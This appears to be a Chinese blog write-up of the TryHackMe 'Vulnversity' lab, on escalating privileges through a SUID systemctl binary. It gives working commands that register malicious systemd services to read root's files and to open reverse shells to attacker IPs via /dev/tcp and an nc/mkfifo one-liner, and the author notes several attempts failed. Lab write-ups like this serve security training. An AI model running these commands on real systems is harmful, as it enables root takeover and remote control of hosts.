---
title: TryHackMe-Vulnversity
description: 'Basic Computer Exploitation'
pubDate: 2024-03-30
image: /image/tryhackme.jpg
categories:
  - Documentation
tags:
  - Tryhackme
---


# 权限提升
<font style="color:rgb(21, 28, 43);">在 Linux 中，SUID（执行时设置所有者用户 ID）是授予文件的特定类型的文件权限。SUID 向用户授予临时权限，以文件所有者（而不是运行程序的用户）的权限运行程序/文件。例如，用于更改密码的二进制文件设置了 SUID 位 （/usr/bin/passwd）。这是因为要更改密码;它需要写入您无权访问的 shadowers 文件，root 需要;因此，它具有进行正确更改的 root 权限。</font>

## <font style="color:rgb(21, 28, 43);">1.在系统上，搜索所有 SUID 文件。哪个文件脱颖而出？</font>
<font style="color:rgb(21, 28, 43);">On the system, search for all SUID files. Which file</font><font style="color:rgb(21, 28, 43);"> stands out?</font>

> <font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">find / -perm -u=s -type f 2>/dev/null    查找系统所有无法访问的文件</font>
>
> <font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">/bin/systemctl 文件具备suid位可以用来提权</font>
>

## 2.利用<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">/bin/systemctl提权并提取/root文件</font>
## 方法一（复现失败）
文章

[https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)

<font style="color:rgb(64, 64, 64);">稍加修改：</font>

### <font style="color:rgb(64, 64, 64);">1.将执行语句改为读取/root/root.txt的内容</font>
### <font style="color:rgb(64, 64, 64);">2.systemctl需要带上绝对路径</font>
> TF=$(mktemp).service
>
> echo '[Service]
>
> Type=oneshot
>
> ExecStart=/bin/sh-c "cat /root/root.txt > /tmp/output"
>
> [Install]
>
> WantedBy=multi-user.target'> $TF
>
> /bin/systemctllink $TF
>
> /bin/systemctl
>
> enable --now $TF
>

![](https://cdn.nlark.com/yuque/0/2024/webp/40628873/1711729018214-cf328c24-a951-494f-9541-8cef66946b3d.webp)

按理来讲效果如图所示成功讲root.txt转储为output.txt

但是我没成功.......

### 再更改点数据进行反弹shll
> TF=$(mktemp).service
>
> echo '[Service]
>
> Type=oneshot
>
> ExecStart=/bin/bash -c "/bin/bash -i > /dev/tcp/10.10.167.14/2222 0>&1 2<&1"
>
> [Install]
>
> WantedBy=multi-user.target' > $TF
>
> ./systemctl link $TF
>
> ./systemctl enable --now $TF
>

还是失败了

## 方法二（操作没看懂）
<font style="color:rgb(85, 86, 102);background-color:rgb(238, 240, 244);">/bin/systemctl文件拥有sudo权限,新建一个service让systemctl加载服务,即可执行任意脚本</font>

> www-data@vulnuniversity:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.23.70 7788 >/tmp/f" > /tmp/shell.sh
>
> www-data@vulnuniversity:/tmp$ TF=$(mktemp).service
>
> www-data@vulnuniversity:/tmp$ echo '[Service]
>
> > Type=oneshot
>
> > ExecStart=/bin/sh -c "bash /tmp/shell.sh"
>
> > [Install]
>
> > WantedBy=multi-user.target' > $TF
>
> www-data@vulnuniversity:/tmp$ /bin/systemctl link $TF
>
> Created symlink from /etc/systemd/system/tmp.CHTuvfkaoz.service to /tmp/tmp.CHTuvfkaoz.service.
>
> www-data@vulnuniversity:/tmp$ /bin/systemctl enable --now $TF
>
> Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.CHTuvfkaoz.service to /tmp/tmp.CHTuvfkaoz.service.
>



## <font style="color:rgb(64, 64, 64);background-color:rgb(250, 250, 250);">方法三(死活不弹)</font>
<font style="color:rgb(64, 64, 64);background-color:rgb(250, 250, 250);">反弹shell</font>

<font style="color:rgb(77, 77, 77);">使用echo写入shell.service，注意，写入目录一定是/dev/shm/</font>

> <font style="color:rgb(77, 77, 77);">cd /dev/shm/</font>
>
> echo '[Service]
>
> Type=oneshot
>
> ExecStart=/bin/bash -c "/bin/bash -i > /dev/tcp/10.10.167.14/4444 0>&1 2<&1"
>
> [Install]
>
> WantedBy=multi-user.target' > shell.service
>

<font style="color:rgb(77, 77, 77);">然后依次执行以下两条命令，就会反弹一个root的shell</font>

> <font style="color:rgb(77, 77, 77);">systemctl link /dev/shm/shell.service</font>
>

> <font style="color:rgb(77, 77, 77);">systemctl enable --now /dev/shm/shell.service</font>
>

<font style="color:rgb(77, 77, 77);">利用nc -lvnp 4444</font>

